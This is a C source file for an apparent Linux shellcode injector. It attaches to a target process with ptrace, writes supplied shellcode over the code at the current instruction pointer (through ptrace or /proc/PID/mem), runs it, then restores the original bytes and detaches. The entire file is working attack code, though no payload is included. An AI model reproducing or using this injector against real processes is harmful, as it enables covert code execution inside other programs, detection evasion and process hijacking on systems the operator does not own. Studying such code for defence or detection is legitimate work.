#include "inject.h"


void ptrace_attach(pid_t pid){
	int status;

	if( ptrace(PTRACE_ATTACH, pid, NULL, NULL) ==  - 1){
		bad("failed to attach pid %d | %s\n", pid, strerror(errno));
		exit(1);
	}

	waitpid(pid, &status, 0);

}

inline long getip(pid_t pid){
	return ptrace(PTRACE_PEEKUSER, pid, sizeof(long)*IP, 0L);
}

inline long setip(pid_t pid, long ip){
	return ptrace(PTRACE_POKEUSER, pid, sizeof(long)*IP, ip);
}

void ptrace_write(pid_t pid, long addr, const void *data, size_t len){
	size_t i;
	long word, old;
	int final_size;

	for(i=0; i<len; i+=wordsize){
		if((i+wordsize) > len){
			final_size = len-i;
			word = 0;

			memcpy(&word, data+i, final_size);
			old = ptrace(PTRACE_PEEKDATA, pid, addr+i, 0L);
			old &= (unsigned long)-1 << (8*final_size);
			word |= old;
			ptrace(PTRACE_POKEDATA, pid, addr+i, word);

		} else {
			word = *(long *)(data+i);
			ptrace(PTRACE_POKEDATA, pid, addr+i, word);
		}
	}
}


void ptrace_read(pid_t pid, long addr, void *output, size_t n){
	size_t i;
	long bytes;


	for(i=0; i<n; i+=wordsize){
		bytes = ptrace(PTRACE_PEEKDATA, pid, addr+i, 0L);
		if((i+wordsize) > n){
			memcpy((output+i), &bytes, n-i);
		} else {
			*(long *)(output+i) = bytes;
		}
	}

}


void ps_inject(const char *sc, size_t len, mypid_t pid, int save, int use_ptrace, int restore_ip){
	char *instructions_backup, memfile[100];
	int status, memfd;
	long instruction_point;

	info("Attaching process %s\n", pid.str);
	ptrace_attach(pid.number);
	good("process attached\n");

	instruction_point = getip(pid.number);

	if(!use_ptrace){
		info("opening /proc/%s/mem\n", pid.str);
		snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);
		memfd = xopen(memfile, O_RDWR);
		good("sucess\n");
	}

	if(save){
		instructions_backup = xmalloc(len+BREAKPOINT_LEN);
		info("backup previously instructions\n");

		(use_ptrace) ? 	ptrace_read(pid.number, instruction_point, instructions_backup, len+BREAKPOINT_LEN) :
				pread(memfd, instructions_backup, len+BREAKPOINT_LEN, instruction_point);
	}

	info("writing shellcode on memory\n");

	(use_ptrace) ? 	ptrace_write(pid.number, instruction_point, sc, len) :
			pwrite(memfd, sc, len, instruction_point);

	good("Shellcode inject !!!\n");

	if(save){
		info("resuming application ...\n");
		(use_ptrace) ? 	ptrace_write(pid.number, instruction_point+len, BREAKPOINT, BREAKPOINT_LEN) :
				pwrite(memfd, BREAKPOINT, BREAKPOINT_LEN, instruction_point+len);

		ptrace(PTRACE_CONT, pid.number, NULL, 0);
		waitpid(pid.number, &status, 0);

		info("restoring memory instructions\n");
		(use_ptrace) ? 	ptrace_write(pid.number, instruction_point, instructions_backup, len+BREAKPOINT_LEN) :
				pwrite(memfd, instructions_backup, len+BREAKPOINT_LEN, instruction_point);

		xfree(instructions_backup);

		if(restore_ip){
			setip(pid.number, instruction_point);
		}

		#if defined(__x86_64__) || defined(__i386__)
		else {
			setip(pid.number, getip(pid.number)-BREAKPOINT_LEN);
		}
		#endif
	}

	info("detaching pid ...\n");
	ptrace(PTRACE_DETACH, pid.number, NULL, NULL);


}
